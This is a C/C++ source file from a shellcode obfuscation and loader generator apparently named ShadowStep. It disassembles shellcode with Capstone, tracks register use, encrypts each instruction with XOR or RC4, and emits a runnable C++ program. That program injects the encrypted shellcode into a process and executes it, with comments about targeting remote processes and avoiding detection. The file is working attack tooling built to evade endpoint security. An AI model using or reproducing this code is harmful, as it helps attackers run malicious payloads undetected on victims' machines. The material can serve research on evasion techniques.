#include <stdio.h>
#include <capstone/capstone.h>
#include <windows.h>
#include "../crypt/crypt.h"
#include <stdlib.h>
#include <time.h>
#include "../core/core.h"

/*
If you installed Capstone in a different way use the following guide.
Setup instructions for Visual Studio (x64):

1. Add capstone headers:
    Project > Properties > C/C++ > General > Additional Include Directories
    Add the path to the include folder (es. C:\libs\capstone\include)

2. Add the library to the linker:
    Project > Properties > Linker > General > Additional Library Directories
    Add the path to the folder with the capstone.lib file (es. C:\libs\capstone\msvc or \lib)

3. Specify the linked library:
    Project > Properties > Linker > Input > Additional Dependencies
    Add: "capstone.lib"
*/


/*
 * Maps a register name (as returned by Capstone) to an internal register index.
 *
 * Registers that are not tracked (flags, segments, instruction pointer,
 * stack/base pointer) return -1.
 *
 * Multiple architectural aliases (rax/eax/ax/al/ah) map to the same index.
 */

int GetRegisterIndex(const char* name) {
    if (!name) return -1;

    // exclude flags, segments, and the instruction pointer register
    if (strncmp(name, "rflags", 6) == 0 || strcmp(name, "eflags") == 0) return -1;
    if (strstr(name, "ip") != NULL) return -1;
    if (strcmp(name, "cs") == 0 || strcmp(name, "ds") == 0 ||
        strcmp(name, "es") == 0 || strcmp(name, "fs") == 0 ||
        strcmp(name, "gs") == 0 || strcmp(name, "ss") == 0) return -1;

    // notice that multiple registers are mapped to the same index number
    if (strcmp(name, "rax") == 0 || strcmp(name, "eax") == 0 || strcmp(name, "ax") == 0 ||
        strcmp(name, "al") == 0 || strcmp(name, "ah") == 0) return 0;

    if (strcmp(name, "rbx") == 0 || strcmp(name, "ebx") == 0 || strcmp(name, "bx") == 0 ||
        strcmp(name, "bl") == 0 || strcmp(name, "bh") == 0) return 1;

    if (strcmp(name, "rcx") == 0 || strcmp(name, "ecx") == 0 || strcmp(name, "cx") == 0 ||
        strcmp(name, "cl") == 0 || strcmp(name, "ch") == 0) return 2;

    if (strcmp(name, "rdx") == 0 || strcmp(name, "edx") == 0 || strcmp(name, "dx") == 0 ||
        strcmp(name, "dl") == 0 || strcmp(name, "dh") == 0) return 3;

    if (strcmp(name, "rsi") == 0 || strcmp(name, "esi") == 0 || strcmp(name, "si") == 0 ||
        strcmp(name, "sil") == 0) return 4;

    if (strcmp(name, "rdi") == 0 || strcmp(name, "edi") == 0 || strcmp(name, "di") == 0 ||
        strcmp(name, "dil") == 0) return 5;

    if (strcmp(name, "rsp") == 0 || strcmp(name, "esp") == 0 || strcmp(name, "sp") == 0 ||
        strcmp(name, "spl") == 0) return -1;

    if (strcmp(name, "rbp") == 0 || strcmp(name, "ebp") == 0 || strcmp(name, "bp") == 0 ||
        strcmp(name, "bpl") == 0) return -1;

    if (strcmp(name, "r8") == 0 || strcmp(name, "r8d") == 0 || strcmp(name, "r8w") == 0 || strcmp(name, "r8b") == 0) return 8;
    
    if (strcmp(name, "r9") == 0 || strcmp(name, "r9d") == 0 || strcmp(name, "r9w") == 0 || strcmp(name, "r9b") == 0) return 9;
    
    if (strcmp(name, "r10") == 0 || strcmp(name, "r10d") == 0 || strcmp(name, "r10w") == 0 || strcmp(name, "r10b") == 0) return 10;
    
    if (strcmp(name, "r11") == 0 || strcmp(name, "r11d") == 0 || strcmp(name, "r11w") == 0 || strcmp(name, "r11b") == 0) return 11;
    
    if (strcmp(name, "r12") == 0 || strcmp(name, "r12d") == 0 || strcmp(name, "r12w") == 0 || strcmp(name, "r12b") == 0) return 12;
    
    if (strcmp(name, "r13") == 0 || strcmp(name, "r13d") == 0 || strcmp(name, "r13w") == 0 || strcmp(name, "r13b") == 0) return 13;
    
    if (strcmp(name, "r14") == 0 || strcmp(name, "r14d") == 0 || strcmp(name, "r14w") == 0 || strcmp(name, "r14b") == 0) return 14;
    
    if (strcmp(name, "r15") == 0 || strcmp(name, "r15d") == 0 || strcmp(name, "r15w") == 0 || strcmp(name, "r15b") == 0) return 15;

    return -1;
}

/*
 * This function is used to generate the ShadowStep main source file
 * programmatically.
*/
static BOOL WriteToFile(HANDLE hFile, const char* fmt, ...)
{
    char buf[8192];

    va_list ap;
    va_start(ap, fmt);
    int len = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    if (len < 0) return FALSE;

    DWORD written = 0;
    return WriteFile(hFile, buf, (DWORD)len, &written, NULL) && written == (DWORD)len;
}

/*
 * main code generator:
 *
 *  - disassembles the shellcode using Capstone
 *  - computes instruction offsets, sizes, and register access masks
 *  - encrypts each instruction individually
 *  - emits a standalone C++ file containing:
 *      - encrypted shellcode
 *      - decryption keys
 *      - metadata required by ShadowStep
 *      - a runnable main() function
 */
BOOL GenerateShadowStepMain(LPCWSTR OutputFile, PBYTE shellcode, SIZE_T shellcodeSize, PBYTE keys = NULL, SIZE_T keySize = 0, EncryptionType encryption = ENCRYPTION_XOR) {

    // arbitrary value: twenty elements per line
    const int PER_LINE = 20;  

    // algorithm for XOR key generation
    if (keys == NULL || keySize == 0) {
        srand((unsigned int)time(NULL));  // random seed generation
        keySize = (rand() % 9) + 2;        // key size in range [2,10], again arbitrary range
        keys = (PBYTE)malloc(keySize);
        if (!keys) {
            printf("[-] Failed to allocate memory for random keys\n");
            return FALSE;
        }
        for (size_t i = 0; i < keySize; i++) {
            keys[i] = (BYTE)(rand() % 256);
        }
        printf("[+] Generated random key array of size %zu\n", keySize);
    }

    csh handle;
    cs_insn* insn;
    SIZE_T count;

    // initialize Capstone for x86_64
    if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
        printf("[-] Failed to initialize capstone\n");
        return FALSE;
    }
    // enable detail mode to access registers
    cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);

    DWORD* OffsetOfInstructions;
    DWORD* SizeOfInstructions;

    HANDLE hFile = CreateFileW(
        OutputFile,              
        GENERIC_WRITE,
        FILE_SHARE_READ, // not sure if this is actually useful
        NULL,
        CREATE_ALWAYS, // always overwrite the original file
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Errore CreateFileW: %lu\n", GetLastError());
        return 1;
    }

    WriteToFile(hFile, "\n// ================== SHELLCODE ANALYSIS ======================\n\n");

    // disassemble the shellcode and analyze each instruction
    count = cs_disasm(handle, shellcode, shellcodeSize, 0x0, 0, &insn);
    if (count > 0) {
        WriteToFile(hFile, "// [+] found %zu instructions:\n\n", count);

        OffsetOfInstructions = (DWORD*)malloc(count * sizeof(DWORD));
        SizeOfInstructions = (DWORD*)malloc(count * sizeof(DWORD));

        uint32_t* RegMasks = (uint32_t*)malloc(count * sizeof(uint32_t));


        /*
         * analyze each instruction:
         *  - track offset and size
         *  - compute a bitmask of registers read
         *  - encrypt instruction bytes
         */
        for (size_t i = 0; i < count; i++) {
            WriteToFile(hFile, "// 0x%llx:\t%-6s %-20s (size: %2u bytes)\n",
                (unsigned long long)insn[i].address,
                insn[i].mnemonic,
                insn[i].op_str,
                insn[i].size);

            OffsetOfInstructions[i] = (DWORD)insn[i].address;
            SizeOfInstructions[i] = (DWORD)insn[i].size;

            uint16_t regs_read[12];
            uint8_t count_read = 0;
            uint16_t regs_write[12];
            uint8_t count_write = 0;

            uint32_t mask = 0;
            RegMasks[i] = 0;

            if (cs_regs_access(handle, &insn[i], regs_read, &count_read, regs_write, &count_write) == 0) {

                for (uint8_t j = 0; j < count_read; j++) {
                    const char* regname = cs_reg_name(handle, regs_read[j]);
                    int reg_index = GetRegisterIndex(regname);
                    if (reg_index >= 0 && reg_index < NUM_TRACKED_REGS) {
                        mask |= (1U << reg_index);

                    }
                }
                // save the bitmask for the current instruction
                RegMasks[i] = mask;  
            }

            // encrypt the instruction bytes
            ApplyCryptInstruction(&shellcode, insn[i].address, insn[i].size, keys, keySize, encryption);
        }

        /*
         * Emit the generated C++ main file.
         * This file contains everything needed to run ShadowStep.
         */
        WriteToFile(hFile, "\n// ================== C++ MAIN FUNCTION ======================\n\n");
        WriteToFile(hFile, "#include <windows.h>\n");
        WriteToFile(hFile, "#include <stdio.h>\n");
        WriteToFile(hFile, "#include \"../../ShadowStep.Compiler/core/core.h\"\n");
        WriteToFile(hFile, "#include \"../../ShadowStep.Compiler/inject/inject.h\"\n");
        WriteToFile(hFile, "\n");
        WriteToFile(hFile, "int main() {\n");
        WriteToFile(hFile, "    // change this to target a remote process\n");
        WriteToFile(hFile, "    HANDLE hProcess = (HANDLE)-1;\n\n");

        // print keys[]
        // TODO: implement keys brute force to avoid clear text storage
        WriteToFile(hFile, "    BYTE keys[] = { ");
        for (size_t i = 0; i < keySize; i++) {
            WriteToFile(hFile, "0x%02X", keys[i]);
            if (i < keySize - 1) WriteToFile(hFile, ", ");
        }
        WriteToFile(hFile, " };\n\n");

        // print offsetOfInstructions[]
        WriteToFile(hFile, "    DWORD offsetOfInstructions[] = {\n        ");
        for (size_t i = 0; i < count; i++) {
            WriteToFile(hFile, "0x%02X", OffsetOfInstructions[i]);
            if (i < count - 1) WriteToFile(hFile, ", ");
            if ((i + 1) % PER_LINE == 0 && i != count - 1) WriteToFile(hFile, "\n        ");
        }
        WriteToFile(hFile, "\n    };\n\n");

        // print sizeOfInstructions[]
        WriteToFile(hFile, "    DWORD sizeOfInstructions[] = {\n        ");
        for (size_t i = 0; i < count; i++) {
            WriteToFile(hFile, "0x%02X", SizeOfInstructions[i]);
            if (i < count - 1) WriteToFile(hFile, ", ");
            if ((i + 1) % PER_LINE == 0 && i != count - 1) WriteToFile(hFile, "\n        ");
        }
        WriteToFile(hFile, "\n    };\n\n");

        // print regMasks[]
        WriteToFile(hFile, "    DWORD regMasks[] = {\n        ");
        for (size_t i = 0; i < count; i++) {
            WriteToFile(hFile, "0x%0X", RegMasks[i]);
            if (i < count - 1) WriteToFile(hFile, ", ");
            if ((i + 1) % PER_LINE == 0 && i != count - 1) WriteToFile(hFile, "\n        ");
        }
        WriteToFile(hFile, "\n    };\n\n");


        for (size_t i = 0; i < shellcodeSize; i++) {
            shellcode[i] ^= keys[0];
        }

        // print shellcode[]
        WriteToFile(hFile, "    BYTE shellcode[] = {\n        ");
        for (size_t i = 0; i < shellcodeSize; i++) {
            WriteToFile(hFile, "0x%02X", shellcode[i]);
            if (i < shellcodeSize - 1) WriteToFile(hFile, ", ");
            if ((i + 1) % PER_LINE == 0 && i != shellcodeSize - 1) WriteToFile(hFile, "\n        ");
        }
        WriteToFile(hFile, "\n    };\n\n");

        WriteToFile(hFile, "    SIZE_T shellcodeSize = sizeof(shellcode);\n\n");
        WriteToFile(hFile, "    PVOID address = NULL;\n");
        WriteToFile(hFile, "    // standard injection method: change this to avoid detection\n");
        WriteToFile(hFile, "    if (!InjectShellcode(hProcess, shellcode, shellcodeSize, &address)) {\n");
        WriteToFile(hFile, "        printf(\"[-] failed to inject shellcode\\n\");\n");
        WriteToFile(hFile, "        return -1;\n");
        WriteToFile(hFile, "    }\n\n");
        WriteToFile(hFile, "    ShellcodeContext* sc = new ShellcodeContext();\n\n");
        WriteToFile(hFile, "    if (!Setup(\n");
        WriteToFile(hFile, "        hProcess,\n");
        WriteToFile(hFile, "        address,\n");
        WriteToFile(hFile, "        shellcodeSize,\n");
        WriteToFile(hFile, "        keys,\n");
        WriteToFile(hFile, "        sizeof(keys),\n");
        WriteToFile(hFile, "        offsetOfInstructions,\n");
        WriteToFile(hFile, "        sizeOfInstructions,\n");
        WriteToFile(hFile, "        regMasks,\n");
        WriteToFile(hFile, "        sizeof(offsetOfInstructions) / sizeof(DWORD),\n");
        if (encryption == ENCRYPTION_XOR) {
            WriteToFile(hFile, "        ENCRYPTION_XOR,\n");
        }
        else {
            WriteToFile(hFile, "        ENCRYPTION_RC4,\n");
        }
        WriteToFile(hFile, "        sc)) {\n");
        WriteToFile(hFile, "        printf(\"[-] failed to initialize shadow step\\n\");\n");
        WriteToFile(hFile, "        return -1;\n");
        WriteToFile(hFile, "    }\n\n");

        WriteToFile(hFile, "    printf(\"[+] initialized shadow step\\n[+] running obfuscated shellcode\\n\");\n");
        WriteToFile(hFile, "    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&ShellcodeRunner, sc, 0, NULL);\n");
        WriteToFile(hFile, "    WaitForSingleObject(hThread, INFINITE);\n\n");
        WriteToFile(hFile, "    printf(\"[+] shellcode execution terminated\\n\");\n");
        WriteToFile(hFile, "    return 0;\n");
        WriteToFile(hFile, "}\n");

        WriteToFile(hFile, "\n// ================= END OF MAIN FUNCTION ======================\n");
    }
    else {
        printf("Failed to disassemble\n");
        return FALSE;
    }

    // close handle to target source file
    CloseHandle(hFile);

    cs_close(&handle);

    free(OffsetOfInstructions);
    free(SizeOfInstructions);

    return TRUE;
}
